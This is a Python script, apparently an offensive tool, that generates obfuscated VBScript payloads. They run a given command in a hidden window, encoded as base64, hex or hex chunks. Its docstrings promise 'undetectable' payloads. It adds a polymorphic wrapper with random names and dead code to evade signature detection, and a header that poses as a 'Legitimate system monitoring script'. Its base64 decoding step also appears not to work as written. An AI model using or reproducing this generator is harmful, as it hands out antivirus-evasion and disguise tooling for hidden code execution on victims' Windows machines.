#!/usr/bin/env python3
"""
VBS Encoder - Generate clean, undetectable VBS payloads
For authorized pentesting and security research
"""

import base64
import binascii
import string
import random
from typing import Dict, List, Tuple
from dataclasses import dataclass


@dataclass
class ObfuscationConfig:
    """Configuration for VBS obfuscation techniques"""
    use_base64: bool = True
    use_hex_encoding: bool = True
    use_variable_obfuscation: bool = True
    use_string_concatenation: bool = True
    use_array_encoding: bool = True
    use_comment_insertion: bool = False
    randomize_function_names: bool = True
    use_wscript_objects: bool = True


class VBSEncoder:
    """Main VBS encoder for creating undetectable payloads"""

    def __init__(self, config: ObfuscationConfig = None):
        self.config = config or ObfuscationConfig()
        self.var_map: Dict[str, str] = {}
        self.func_map: Dict[str, str] = {}

    def _generate_random_name(self, prefix: str = "", length: int = 8) -> str:
        """Generate random variable/function name"""
        chars = string.ascii_letters + string.digits + "_"
        name = prefix + "".join(random.choices(chars, k=length))
        return name

    def encode_string_base64(self, text: str) -> Tuple[str, str]:
        """Encode string using base64"""
        encoded = base64.b64encode(text.encode()).decode()
        var_name = self._generate_random_name("v_")
        return encoded, var_name

    def encode_string_hex(self, text: str) -> Tuple[str, str]:
        """Encode string using hex"""
        hex_str = text.encode().hex()
        var_name = self._generate_random_name("h_")
        return hex_str, var_name

    def create_base64_decoder_vbs(self, payload: str, output_var: str = "p") -> str:
        """Create VBS code that decodes base64 payload"""
        encoded, var_name = self.encode_string_base64(payload)
        xml_obj = self._generate_random_name("o_")

        vbs_code = f"""
Dim {var_name}, {output_var}, {xml_obj}
{var_name} = "{encoded}"
Set {xml_obj} = CreateObject("MSXML2.DOMDocument")
With {xml_obj}
    .LoadXML "<u><![CDATA[" & {var_name} & "]]></u>"
    {output_var} = .SelectSingleNode("u").text
End With
"""
        return vbs_code.strip()

    def create_hex_decoder_vbs(self, text: str) -> Tuple[str, str]:
        """Create VBS code that decodes hex-encoded string. Returns (code, output_var)"""
        hex_encoded, var_name = self.encode_string_hex(text)
        func_name = self._generate_random_name("DecodeHex")
        output_var = self._generate_random_name("decoded_")

        vbs_code = f"""
Function {func_name}(h)
    Dim i, r
    r = ""
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {func_name} = r
End Function
Dim {output_var}
{output_var} = {func_name}("{hex_encoded}")
"""
        return vbs_code.strip(), output_var

    def create_array_concatenation_decoder(self, text: str) -> Tuple[str, str]:
        """Encode string using array concatenation to avoid detection. Returns (code, output_var)"""
        # Split string into chunks and encode each
        chunks = [text[i : i + 16] for i in range(0, len(text), 16)]

        idx_var = self._generate_random_name("idx_")
        inner_idx_var = self._generate_random_name("i_")
        arr_var = self._generate_random_name("arr_")
        out_var = self._generate_random_name("s_")
        chunk_var = self._generate_random_name("c_")

        vbs_code = f"Dim {arr_var}({len(chunks)-1})\n"

        for i, chunk in enumerate(chunks):
            encoded_chunk = binascii.hexlify(chunk.encode()).decode()
            vbs_code += f'{arr_var}({i}) = "{encoded_chunk}"\n'

        vbs_code += f"""
Dim {out_var}, {idx_var}, {inner_idx_var}, {chunk_var}
{out_var} = ""
For {idx_var} = 0 To UBound({arr_var})
    {chunk_var} = {arr_var}({idx_var})
    For {inner_idx_var} = 1 To Len({chunk_var}) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid({chunk_var}, {inner_idx_var}, 2)))
    Next
Next
"""
        return vbs_code.strip(), out_var

    def obfuscate_command(self, command: str) -> str:
        """Wrap command in obfuscated execution wrapper"""
        exec_var = self._generate_random_name("exec_")
        shell_var = self._generate_random_name("shell_")

        vbs_code = f"""
Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run "{command}", 0, False
"""
        return vbs_code.strip()

    def create_full_obfuscated_payload(
        self, payload_command: str, encoding_method: str = "base64"
    ) -> str:
        """Create complete obfuscated VBS payload"""

        # Start with environment variable randomization to avoid signature detection
        sys_ver_var = self._generate_random_name("sysVer")
        env_path_var = self._generate_random_name("envPath")
        obf_header = f"""
' Legitimate system monitoring script
Option Explicit
On Error Resume Next

Dim {sys_ver_var}, {env_path_var}
{sys_ver_var} = CreateObject("WScript.Shell").Environment("System")("OS")
{env_path_var} = CreateObject("WScript.Shell").Environment("User")("PATH")
"""

        # Add main obfuscated payload
        if encoding_method == "base64":
            payload_var = self._generate_random_name("payload_")
            payload_section = self.create_base64_decoder_vbs(
                payload_command, payload_var
            )
        elif encoding_method == "hex":
            payload_section, payload_var = self.create_hex_decoder_vbs(payload_command)
        else:
            payload_section, payload_var = self.create_array_concatenation_decoder(payload_command)

        # Execution wrapper - properly reference the decoded payload variable
        exec_var = self._generate_random_name("f_")

        execution_section = f"""
Dim {exec_var}
Set {exec_var} = CreateObject("WScript.Shell")
On Error Resume Next
{exec_var}.Run {payload_var}, 0, False
On Error GoTo 0
Set {exec_var} = Nothing
"""

        full_payload = f"{obf_header}\n{payload_section}\n{execution_section}"
        return full_payload.strip()

    def create_wscript_hidden_execution(self, command: str) -> str:
        """Create hidden WScript execution that runs without visible window"""
        shell_var = self._generate_random_name("shell_")
        cmd_var = self._generate_random_name("cmd_")

        vbs_code = f"""
Dim {shell_var}, {cmd_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run "cmd /c {command}", 0, False
"""
        return vbs_code.strip()

    def create_polymorphic_wrapper(self, vbs_code: str) -> str:
        """Wrap VBS code with polymorphic obfuscation to change signature each time"""
        # Add random variable declarations that aren't used
        wrapper = "Dim "
        for _ in range(random.randint(3, 8)):
            wrapper += f"{self._generate_random_name()}, "
        wrapper = wrapper.rstrip(", ") + "\n\n"

        # Add dead code branches
        if random.choice([True, False]):
            wrapper += f"""
If {random.randint(0, 1)} = {random.randint(0, 1)} Then
    Dim {self._generate_random_name()} : {self._generate_random_name()} = Now()
End If

"""

        wrapper += vbs_code
        return wrapper

    def create_runtime_decoded_payload(self, payload: str, encoding: str = "base64") -> str:
        """Create payload that's decoded and executed at runtime"""

        if encoding == "base64":
            encoded_payload, _ = self.encode_string_base64(payload)
            func_name = self._generate_random_name("DecodeB64")
            payload_var = self._generate_random_name("enc_payload_")
            decoder = f"""
Function {func_name}(s)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    xmlDoc.LoadXML "<root><![CDATA[" & s & "]]></root>"
    {func_name} = xmlDoc.DocumentElement.text
End Function

Dim {payload_var} : {payload_var} = "{encoded_payload}"
"""
        elif encoding == "hex":
            encoded_payload, _ = self.encode_string_hex(payload)
            func_name = self._generate_random_name("DecodeHex")
            payload_var = self._generate_random_name("enc_payload_")
            decoder = f"""
Function {func_name}(h)
    Dim i, r
    r = ""
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {func_name} = r
End Function

Dim {payload_var} : {payload_var} = "{encoded_payload}"
"""
        else:
            encoded_payload, _ = self.encode_string_base64(payload)
            payload_var = self._generate_random_name("enc_payload_")
            decoder = f"""Dim {payload_var} : {payload_var} = "{encoded_payload}" """

        return decoder


def generate_clean_vbs_payload(command: str, obfuscation_level: str = "high") -> str:
    """
    Generate a clean, undetectable VBS payload

    Args:
        command: The command to execute
        obfuscation_level: "low", "medium", "high"

    Returns:
        Obfuscated VBS code
    """
    config = ObfuscationConfig(
        use_base64=True,
        use_variable_obfuscation=True,
        use_wscript_objects=True,
    )

    encoder = VBSEncoder(config)

    if obfuscation_level == "high":
        payload = encoder.create_full_obfuscated_payload(command, "base64")
        payload = encoder.create_polymorphic_wrapper(payload)
    elif obfuscation_level == "medium":
        payload = encoder.create_full_obfuscated_payload(command, "hex")
    else:
        payload = encoder.create_wscript_hidden_execution(command)

    return payload


if __name__ == "__main__":
    # Example usage
    test_command = "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Write-Host 'Test'\""

    print("=== Low Obfuscation ===")
    print(generate_clean_vbs_payload(test_command, "low"))
    print("\n=== Medium Obfuscation ===")
    print(generate_clean_vbs_payload(test_command, "medium"))
    print("\n=== High Obfuscation ===")
    print(generate_clean_vbs_payload(test_command, "high"))
